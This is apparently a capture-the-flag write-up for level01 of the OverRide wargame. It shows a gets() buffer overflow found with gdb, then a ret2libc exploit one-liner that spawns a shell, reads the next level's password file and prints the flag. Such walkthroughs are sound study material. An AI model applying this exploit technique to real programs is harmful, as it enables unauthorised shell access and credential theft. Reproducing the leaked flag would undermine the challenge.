@@ -1,0 +1,72 @@
+
+
+in this level we found that there is two other functions other than main:
+------------------------------------------
+(gdb) info functions
+Non-debugging symbols:
+0x08048318  _init
+0x08048360  printf
+.
+.
+0x08048464  verify_user_name
+0x080484a3  verify_user_pass
+0x080484d0  main
+.
+.
+0x08048640  __do_global_ctors_aux
+0x0804866c  _fini
+(gdb)
+------------------------------------------
+
+we notice that main has two gets, the first stores the username input and pass it to 
+verify_username that compares it  with the word "dat_wil" in a buffer of 256..
+
+and the second gets has a problem because it tries to store 100 bits in a 64 bytes long buffer.
+and that's obviously the overflow. we already found the overflow so no need to search more.
+
+we approached the overflow using ret2libc.
+
+firstly we need the offset of the overflow that we found in 80bytes:
+------------------------------------------
+(gdb) run
+Starting program: /home/users/level01/level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: dat_wil
+verifying username....
+
+Enter Password:
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+nope, incorrect password...
+
+
+Program received signal SIGSEGV, Segmentation fault.
+0xf7e4000a in ?? () from /lib32/libc.so.6
+(gdb)
+------------------------------------------
+
+then now we need just to find the addresses needed for ret2libc.. which is system and "/bin/sh":
+------------------------------------------
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+(gdb) find &system, +9999999, "/bin/sh"
+0xf7f897ec
+warning: Unable to access target memory at 0xf7fd3b74, halting search.
+1 pattern found.
+(gdb) x/s 0xf7f897ec
+0xf7f897ec:	 "/bin/sh"
+------------------------------------------
+
+we got them all now let's get our flag:
+------------------------------------------
+level01@OverRide:~$ (python -c "print 'dat_wil' + '\n' + 'A' * 80 + '\xf7\xe6\xae\xd0'[::-1] + 'AAAA' + '\xf7\xf8\x97\xec'[::-1]"; cat ) | ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password:
+nope, incorrect password...
+
+ls
+ls: cannot open directory .: Permission denied
+cat /home/users/level02/.pass
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+------------------------------------------
